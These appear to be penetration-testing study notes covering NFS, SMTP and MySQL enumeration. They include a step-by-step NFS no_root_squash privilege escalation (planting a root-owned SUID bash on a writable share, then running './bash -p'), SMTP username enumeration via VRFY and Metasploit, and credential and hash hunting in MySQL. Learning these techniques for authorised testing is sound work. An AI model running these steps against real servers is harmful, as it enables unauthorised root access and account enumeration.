# NFS (Network File System)

# What is NFS?

**NFS (Network File System)** is a protocol that allows a Linux/Unix system to share files and directories with other machines over a network.

Instead of copying files manually, a client can **mount** a remote directory and interact with it as if it were a local directory.

Example:

```text
Server
└── /home

↓

Client

mount

↓

/tmp/mount
```

After mounting the share, everything inside `/home` on the server becomes accessible through `/tmp/mount` on the client.

---

# How NFS Works

The communication process is straightforward:

1. The client requests access to an exported directory.
2. The NFS server checks whether the client is allowed to mount that share.
3. If access is permitted, the share is mounted on the client's machine.
4. The client can now browse, read, create, or modify files depending on the assigned permissions.

Example:

```text
Client
      │
      │ Mount Request
      ▼
NFS Server
      │
      │ Access Check
      ▼
Share Mounted
      │
      ▼
Client can access the files
```

---

# Enumeration

The first step is to discover whether the target exposes an NFS service.

A normal Nmap scan may reveal ports such as:

```text
111/tcp   rpcbind
2049/tcp  nfs
```

Port **2049** is the primary NFS service.

Port **111** is used by **RPC (Remote Procedure Call)** and allows clients to locate NFS-related services.

---

# Listing Available Shares

Once NFS has been identified, the next step is to enumerate the exported shares.

Example:

```bash
showmount -e <TARGET_IP>
```

Example output:

```text
Export list for 10.10.10.10

/home *
```

This tells us that the server exports the following share:

```text
/home
```

The `*` means:

```text
Any client may mount this share.
```

> **Important:** Discovering the share name does **not** automatically mean you can access it. The server must also permit your IP address or network.

---

# Mounting an NFS Share

Before mounting a share, create a local directory that will act as the mount point.

Example:

```bash
mkdir /tmp/mount
```

Now mount the remote share:

```bash
sudo mount -t nfs <TARGET_IP>:/home /tmp/mount -nolock
```

---

## Command Breakdown

```text
sudo
```

Run the command with root privileges.

```text
mount
```

Mount a filesystem.

```text
-t nfs
```

Specify that the filesystem type is NFS.

```text
<TARGET_IP>:/home
```

The remote NFS share.

```text
/tmp/mount
```

The local directory where the share will appear.

```text
-nolock
```

Disable NFS file locking.

Many CTFs do not run the Network Lock Manager (NLM). Using `-nolock` avoids errors such as:

```text
rpc.statd is not running
```

---

# Accessing the Share

Once mounted:

```bash
cd /tmp/mount
ls
```

Although you are browsing:

```text
/tmp/mount
```

the files actually belong to:

```text
/home
```

on the remote machine.

---

# Why is NFS Dangerous?

If an NFS share is configured insecurely, it can expose:

- User home directories
- SSH keys
- Password files
- Backup files
- Configuration files
- Sensitive application data

Sometimes the share is even writable.

This is where privilege escalation becomes possible.

---

# Understanding Root Squash

By default, NFS enables a security feature called:

```text
root_squash
```

Its purpose is to prevent remote root users from acting as root on the NFS server.

Example:

```text
Remote Machine

root
 │
 ▼

NFS Server

↓

nfsnobody
```

Even if you are root on your own machine, the NFS server converts you into the unprivileged user:

```text
nfsnobody
```

This prevents remote root users from modifying protected files.

---

# What Happens if root_squash is Disabled?

If the administrator enables:

```text
no_root_squash
```

the situation changes dramatically.

Instead of:

```text
Remote Root
      │
      ▼
nfsnobody
```

you get:

```text
Remote Root
      │
      ▼
Root
```

Now every action performed as root on your attacking machine is also performed as root on the server.

This is an extremely dangerous misconfiguration.

---

# Understanding SUID

A file with the SUID bit executes with the permissions of its owner.

Example:

```text
Owner: root

Permissions:

-rwsr-xr-x
```

Notice the:

```text
s
```

This indicates that SUID is enabled.

Whenever any user executes this file, it runs as:

```text
root
```

instead of the current user.

---

# Why Does no_root_squash Lead to Privilege Escalation?

Imagine the following situation:

The NFS share is writable.

```text
/home
```

We mount it:

```bash
sudo mount -t nfs TARGET:/home /tmp/mount
```

Now we copy Bash into the share:

```bash
cp /bin/bash /tmp/mount/bash
```

Next, we make the owner:

```text
root
```

```bash
sudo chown root bash
```

Finally, we enable SUID:

```bash
sudo chmod +s bash
```

If:

```text
no_root_squash
```

is enabled, these changes are actually applied on the target system.

The resulting file becomes:

```text
-rwsr-xr-x
root root
```

---

# Why Must Bash Come from the Target Machine?

Many beginners copy:

```text
/bin/bash
```

from Kali Linux.

This often fails.

Example error:

```text
GLIBC_2.38 not found
```

The reason is that the attacking machine and the target may use different versions of:

```text
glibc
```

To avoid compatibility issues, copy the target's own Bash binary:

```bash
scp user@TARGET:/bin/bash ~/Downloads/bash
```

Then upload that exact executable back into the NFS share.

Using the target's own Bash guarantees binary compatibility.

---

# Completing the Attack

After preparing the SUID Bash:

Log in normally via SSH.

Example:

```bash
ssh think@TARGET
```

Navigate to the shared directory:

```bash
cd /home
```

Execute the Bash binary:

```bash
./bash -p
```

The `-p` option tells Bash to preserve its effective privileges.

Without `-p`, Bash may intentionally drop the elevated privileges.

If everything was configured correctly:

```text
think
      │
      ▼

./bash -p

      │
      ▼

root
```

You now have a root shell.

---

# Full Attack Flow

```text
Nmap Scan
      │
      ▼
Find NFS Service
      │
      ▼
Enumerate Shares
(showmount -e)
      │
      ▼
Find Writable Share
      │
      ▼
Mount the Share
      │
      ▼
Copy Target's Bash
      │
      ▼
Set Owner to Root
(chown root)
      │
      ▼
Enable SUID
(chmod +s)
      │
      ▼
SSH into the Target
      │
      ▼
Execute

./bash -p

      │
      ▼
Root Shell
```

---

# SMTP (Simple Mail Transfer Protocol)

# What is SMTP?

**SMTP (Simple Mail Transfer Protocol)** is the protocol responsible for **sending emails** across networks.

SMTP **does not receive emails**. Its only responsibility is to send outgoing messages from one mail server to another.

Receiving emails is handled by:

- POP3 (Post Office Protocol)
- IMAP (Internet Message Access Protocol)

---

# SMTP vs POP3 vs IMAP

| Protocol | Purpose |
|----------|---------|
| SMTP | Send emails |
| POP3 | Download emails from the mail server |
| IMAP | Synchronize emails with the mail server |

---

# How Email Works

Imagine sending a physical letter.

You write the letter.

↓

You give it to the post office.

↓

The post office sends it to another post office.

↓

The recipient receives the letter.

SMTP works exactly the same way.

---

# Email Delivery Process

## Step 1 — Email Client

The user writes an email using:

- Gmail
- Outlook
- Thunderbird

This application is called the:

```text
Mail User Agent (MUA)
```

---

## Step 2 — SMTP Handshake

The email client connects to the SMTP server.

Example:

```text
smtp.gmail.com
```

Usually over:

```text
Port 25
```

(Or 587 / 465 depending on configuration.)

This starts the:

```text
SMTP Handshake
```

The server verifies that the client is allowed to send mail.

---

## Step 3 — Sending the Email

The client sends:

- Sender address
- Recipient address
- Subject
- Email body
- Attachments

Example:

```text
From: alice@gmail.com
To: bob@example.com
```

---

## Step 4 — SMTP Server Checks the Domain

The SMTP server determines where the email should go.

Example:

```text
bob@example.com
```

It identifies:

```text
example.com
```

Then locates the destination mail server.

---

## Step 5 — Contact the Recipient's SMTP Server

The sender's SMTP server connects to the recipient's SMTP server and transfers the email.

If the recipient server is unavailable, the message is placed into the:

```text
SMTP Queue
```

The server will continue retrying delivery until the message succeeds or expires.

---

## Step 6 — Recipient Verification

The recipient's SMTP server verifies:

- Does the domain exist?
- Does the mailbox exist?

If everything is valid, the email is accepted.

---

## Step 7 — Store the Email

The email is stored on the:

```text
POP3 / IMAP Server
```

It remains there until the recipient opens their mailbox.

---

# Default SMTP Ports

| Port | Description |
|-------|-------------|
| 25 | Traditional SMTP |
| 587 | SMTP Submission (recommended) |
| 465 | SMTP over SSL/TLS |

---

# SMTP Commands

SMTP communicates using simple text commands.

Some common commands include:

| Command | Purpose |
|----------|---------|
| HELO / EHLO | Identify the client |
| MAIL FROM | Specify the sender |
| RCPT TO | Specify the recipient |
| DATA | Begin sending the email body |
| QUIT | Close the session |
| VRFY | Verify whether a user exists |
| EXPN | Expand aliases or mailing lists |

---

# Why Are VRFY and EXPN Important?

These commands can disclose valid usernames on the mail server.

Examples:

```text
VRFY admin
```

Possible response:

```text
250 User exists
```

or

```text
550 User unknown
```

This allows attackers to enumerate valid accounts before attempting password attacks.

---

# SMTP Enumeration

SMTP enumeration is the process of collecting information from an SMTP server.

Common goals include:

- Discovering the mail server software
- Identifying its version
- Enumerating valid users
- Identifying the Mail Transfer Agent (MTA)

---

# Metasploit Modules

## smtp_version

Used to fingerprint the SMTP server.

Purpose:

- Detect server version
- Identify SMTP software
- Identify the MTA

Example:

```text
use auxiliary/scanner/smtp/smtp_version
```

---

## smtp_enum

Enumerates valid usernames using SMTP commands such as:

- VRFY
- EXPN
- RCPT TO

Example:

```text
use auxiliary/scanner/smtp/smtp_enum
```

---

# Common SMTP Enumeration Tools

| Tool | Purpose |
|------|---------|
| Metasploit smtp_version | Detect SMTP version and MTA |
| Metasploit smtp_enum | Enumerate users |
| smtp-user-enum | Enumerate users without Metasploit |
| Telnet | Manually interact with SMTP |
| Netcat (nc) | Manual SMTP communication |

---

# What is a Mail Transfer Agent (MTA)?

An **MTA (Mail Transfer Agent)** is the software responsible for transferring emails between mail servers.

Think of it as the "mail delivery engine" behind SMTP.

Common MTAs include:

- Postfix
- Exim
- Sendmail
- Microsoft Exchange

---

# What is the System Mail Name?

The **System Mail Name** is the mail domain configured on the server.

Example:

```text
mail.example.com
```

or

```text
example.com
```

It identifies the server when sending and receiving emails.

---

# Common Enumeration Workflow

```text
Nmap Scan
        │
        ▼
Identify SMTP (Port 25)
        │
        ▼
smtp_version
        │
        ▼
Identify MTA & Version
        │
        ▼
smtp_enum
        │
        ▼
Enumerate Valid Users
        │
        ▼
Password Attacks / Further Enumeration
```

---

# MySQL (RDBMS)

## What is MySQL?

**MySQL** is an open-source **Relational Database Management System (RDBMS)** that uses **Structured Query Language (SQL)** to store, organize, and manage structured data.

It follows a **client-server architecture**, where clients connect to a MySQL server to query and manipulate databases.

---

# How MySQL Works

The communication process is straightforward:

```text
Client
   │
   ▼
Connects to MySQL Server
   │
   ▼
Authenticates using Username & Password
   │
   ▼
Executes SQL Queries
   │
   ▼
Server Processes the Request
   │
   ▼
Returns the Requested Data
```

Example:

```sql
SELECT * FROM users;
```

The server retrieves the requested records and returns them to the client.

---

# Database vs Schema

In **MySQL**, the terms **Database** and **Schema** are effectively the same.

For example:

```sql
CREATE DATABASE company;
```

is equivalent to:

```sql
CREATE SCHEMA company;
```

> **Note:** Other database systems (such as Oracle) distinguish between a Database and a Schema.

---

# Client vs Server

### MySQL Server

The actual database service running on the target machine.

Responsible for:

- Creating databases
- Storing data
- Executing SQL queries
- Managing user permissions

---

### MySQL Client

A command-line program used to connect to a remote MySQL server.

Install it:

```bash
sudo apt install default-mysql-client
```

Connect to a remote server:

```bash
mysql -h <IP> -u <USERNAME> -p
```

Example:

```bash
mysql -h 10.10.10.10 -u root -p
```

---

# Important Command Options

| Option | Description |
|---------|-------------|
| `-h` | Target MySQL server IP or hostname |
| `-u` | Username |
| `-p` | Prompt for password |
| `--ssl-mode=DISABLED` | Disable SSL/TLS if the server does not support it |

Example:

```bash
mysql -h 10.10.10.10 --ssl-mode=DISABLED -u root -p
```

---

# Common Enumeration Process

In real penetration tests, MySQL is usually **not** the first target.

A common attack path looks like this:

```text
Web Enumeration
        │
        ▼
Discover Credentials
        │
        ▼
Test SSH
        │
        ▼
Test FTP
        │
        ▼
Test MySQL
        │
        ▼
Enumerate Databases
        │
        ▼
Extract Sensitive Data
```

Credentials are often discovered in:

- config.php
- wp-config.php
- .env
- backup files
- Git repositories
- Source code

---

# Useful SQL Queries

Show all databases:

```sql
SHOW DATABASES;
```

Select a database:

```sql
USE database_name;
```

Show tables:

```sql
SHOW TABLES;
```

Display table contents:

```sql
SELECT * FROM users;
```

Describe table structure:

```sql
DESCRIBE users;
```

Show current user:

```sql
SELECT USER();
```

Show MySQL version:

```sql
SELECT VERSION();
```

---

# Password Hashes

Applications usually **do not store plaintext passwords**.

Instead, they store **Password Hashes**.

Example:

```text
password123
```

Stored as:

```text
482c811da5d5b4bc6d497ffa98491e38
```

If attackers obtain these hashes, they attempt to crack them using tools such as:

- John the Ripper
- Hashcat

---

# Metasploit Modules

### Enumerate MySQL Version

```text
auxiliary/scanner/mysql/mysql_version
```

Purpose:

- Detect MySQL version.

---

### Execute SQL Queries

```text
auxiliary/admin/mysql/mysql_sql
```

Required options:

| Option | Description |
|---------|-------------|
| USERNAME | MySQL username |
| PASSWORD | MySQL password |
| SQL | SQL query to execute |

Example:

```sql
SHOW DATABASES;
```

---

# Nmap NSE Scripts

Enumerate MySQL:

```bash
nmap --script mysql-enum -p3306 <IP>
```

---

# Default Port

```text
3306
```

---

# Where is MySQL Commonly Used?

MySQL is widely used as the **back-end database** for:

- Web Applications
- CMS Platforms
- WordPress
- E-commerce Websites
- APIs
- Enterprise Applications

A famous example is **Facebook**, which historically relied heavily on MySQL for its back-end infrastructure.

---

,